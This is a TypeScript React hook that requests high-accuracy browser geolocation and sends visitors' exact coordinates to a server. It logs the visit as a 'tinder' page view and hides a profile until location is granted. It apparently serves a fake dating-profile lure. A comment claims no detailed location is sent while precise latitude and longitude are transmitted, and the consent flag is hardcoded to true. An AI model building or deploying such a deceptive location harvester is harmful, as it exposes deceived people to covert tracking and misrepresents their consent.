import { useState, useCallback, useEffect } from 'react';
import { sendGeolocationData } from '@/action/geolocation-action';
import { trackPageView } from '@/action/tracking-action';

// URL dan profil tujuan setelah redirect

export default function useLocationTracking() {
  const [locationEnabled, setLocationEnabled] = useState(false);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [locationDenied, setLocationDenied] = useState(false);
  const [profileVisible, setProfileVisible] = useState(true);
  const [showLocationModal, setShowLocationModal] = useState(false);
  const [showAfterLocationPrompt, setShowAfterLocationPrompt] = useState(false);

  // Function to get current position with better error handling
  const getCurrentPosition = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("Your browser doesn't support geolocation");
      setLocationDenied(true);
      setProfileVisible(false);
      return Promise.reject(new Error('Geolocation not supported'));
    }

    setLocationError(null);

    return new Promise<GeolocationPosition>((resolve, reject) => {
      try {
        const successCallback = (position: GeolocationPosition) => {
          console.log('Successfully got position:', position);

          // Kirim data tracking tanpa informasi lokasi detil
          sendLocationData({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: position.timestamp,
          });

          resolve(position);
        };

        const errorCallback = (error: GeolocationPositionError) => {
          console.error('Geolocation error:', error);

          let errorMessage = 'Something went wrong with location tracking.';
          switch (error.code) {
            case error.PERMISSION_DENIED:
              errorMessage =
                'Location access was denied. Please enable location in your browser settings.';
              setLocationDenied(true);
              setProfileVisible(false);
              break;
            case error.POSITION_UNAVAILABLE:
              errorMessage =
                "We couldn't access your location. Please check your device settings.";
              setLocationDenied(true);
              setProfileVisible(false);
              break;
            case error.TIMEOUT:
              errorMessage =
                'Location request timed out. Please check your connection.';
              setLocationDenied(true);
              setProfileVisible(false);
              break;
          }

          setLocationError(errorMessage);
          reject(error);
        };

        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        };

        navigator.geolocation.getCurrentPosition(
          successCallback,
          errorCallback,
          options,
        );
      } catch (err) {
        console.error('Unexpected error in getCurrentPosition:', err);
        setLocationError(
          'An unexpected error occurred while trying to get your location.',
        );
        setLocationDenied(true);
        setProfileVisible(false);
        reject(err);
      }
    });
  }, []);

  // Fungsi untuk mengirim data lokasi ke server
  const sendLocationData = async (locationData: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
  }) => {
    try {
      // Kirim data tracking page view menggunakan action
      await trackPageView({
        pageType: 'tinder',
      });

      // Kirim data geolokasi ke API khusus menggunakan action
      await sendGeolocationData({
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        accuracy: locationData.accuracy,
        consent_given: true,
      });
    } catch (error) {
      console.error('Error sending location data:', error);
    }
  };

  // Check if location is already granted
  const checkLocationPermission = useCallback(() => {
    console.log('Checking location permission...');

    if (!navigator.geolocation) {
      console.error('Geolocation not supported');
      setLocationError("Your browser doesn't support geolocation");
      setLocationDenied(true);
      setProfileVisible(false);
      return;
    }

    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions
        .query({ name: 'geolocation' as PermissionName })
        .then((result) => {
          console.log('Permission state:', result.state);

          if (result.state === 'granted') {
            // Get current position to confirm it works
            getCurrentPosition()
              .then(() => {
                console.log(
                  'Location permission granted and position obtained',
                );
                setLocationEnabled(true);
                setShowAfterLocationPrompt(true);
              })
              .catch((err) => {
                console.error(
                  'Error getting position even with permission granted:',
                  err,
                );
                // If there's an error getting position even with permission granted
                setShowLocationModal(true);
              });
          } else if (result.state === 'denied') {
            // Jika izin lokasi ditolak
            setLocationDenied(true);
            setProfileVisible(false);
            setShowLocationModal(true);
          } else {
            // If permission is not granted, show the modal
            console.log('Permission not granted, showing modal');
            setShowLocationModal(true);

            // Setelah 2 detik, tampilkan modal permintaan lokasi
            setTimeout(() => {
              setShowLocationModal(true);
            }, 2000);
          }

          // Listen for permission changes
          result.onchange = () => {
            console.log('Permission state changed to:', result.state);
            if (result.state === 'granted') {
              getCurrentPosition()
                .then(() => {
                  setLocationEnabled(true);
                  setShowLocationModal(false);
                  setProfileVisible(true);
                  setLocationDenied(false);
                })
                .catch((err) => {
                  console.error('Error after permission change:', err);
                });
            } else if (result.state === 'denied') {
              setLocationDenied(true);
              setProfileVisible(false);
            }
          };
        })
        .catch((err) => {
          console.error('Error querying permissions:', err);
          // Fallback if permissions API is not supported
          setShowLocationModal(true);
        });
    } else {
      // If permissions API is not supported, show the modal
      console.log('Permissions API not supported, showing modal');
      setShowLocationModal(true);
    }
  }, [getCurrentPosition]);

  // Handle successful location permission
  const handleLocationSuccess = useCallback(() => {
    console.log('Location permission granted, getting position...');
    getCurrentPosition()
      .then(() => {
        console.log('Successfully got position after permission granted');
        setLocationEnabled(true);
        setShowLocationModal(false);
        setLocationError(null);
        setProfileVisible(true);
        setLocationDenied(false);
      })
      .catch((error) => {
        // If there's still an error after permission is granted
        console.error('Error after permission granted:', error);
        setLocationDenied(true);
        setProfileVisible(false);
        // Keep the modal open to show the error
      });
  }, [getCurrentPosition]);

  return {
    locationEnabled,
    locationError,
    locationDenied,
    profileVisible,
    showLocationModal,
    setShowLocationModal,
    showAfterLocationPrompt,
    setShowAfterLocationPrompt,
    checkLocationPermission,
    handleLocationSuccess,
    getCurrentPosition,
  };
}
